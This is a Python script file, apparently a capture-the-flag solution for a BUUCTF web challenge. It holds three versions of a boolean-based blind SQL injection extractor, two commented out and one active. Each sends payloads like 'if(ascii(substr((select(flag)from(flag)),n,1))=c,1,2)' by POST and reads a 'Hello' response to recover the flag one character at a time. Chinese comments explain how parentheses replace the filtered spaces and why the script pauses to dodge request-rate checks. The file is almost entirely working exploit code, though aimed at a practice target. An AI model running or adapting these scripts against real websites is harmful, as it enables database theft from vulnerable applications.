# import requests
# import time

# url = "http://2ec40113-c669-46c8-ad26-c793fd3640a8.node4.buuoj.cn:81/index.php"
# payload = {
# 	"id" : ""
# }
# result = ""
# for i in range(1,100):
# 	l = 33
# 	r =130
# 	mid = (l+r)>>1
# 	while(l<r):
# 		payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# 		html = requests.post(url,data=payload)
# 		print(payload)
# 		if "Hello" in html.text:
# 			l = mid+1
# 		else:
# 			r = mid
# 		mid = (l+r)>>1
# 	if(chr(mid)==" "):
# 		break
# 	result = result + chr(mid)
# 	print(result)
# print("flag: " ,result)

##################################################################################################################################################

# -*- coding:utf-8 -*-
# Author: mochu7
# import requests
# import string

# def blind_injection(url):
# 	flag = ''
# 	strings = string.printable
# 	for num in range(1,60):
# 		for i in strings:
# 			payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
# 			post_data = {"id":payload}
# 			res = requests.post(url=url,data=post_data)
# 			if 'Hello' in res.text:
# 				flag += i
# 				print(flag)
# 			else:
# 				continue
# 	print(flag)


# if __name__ == '__main__':
# 	url = "http://2ec40113-c669-46c8-ad26-c793fd3640a8.node4.buuoj.cn:81"
# 	blind_injection(url)

import requests
import string
import time    ##导入time模块是需要用导time.sleep()，因为有时会检测大量连续请求
url = 'http://2ec40113-c669-46c8-ad26-c793fd3640a8.node4.buuoj.cn:81'
x=string.printable    ##可打印的字符
print(x)

result = ""
for a in range(60):
    for b in x :
        payload= "if(ascii(substr((select(flag)from(flag)),{},1))={},1,2)".format(a+1,ord(b)) 
        ##值得注意的是语句里面部能有空格，因为题目有过滤（）可以替代空格，{}传进去的值相当于define
        ##这里的ord是转为ascii值，如果直接传入 - 题目有过滤，会导致最后的flag不对
        data = { 'id': payload }
        r1=requests.post(url,data=data)
        r2=r1.text
        if "Hello" in r2 :

            result+=b
            print(result)
    if a==20 :
        time.sleep(3)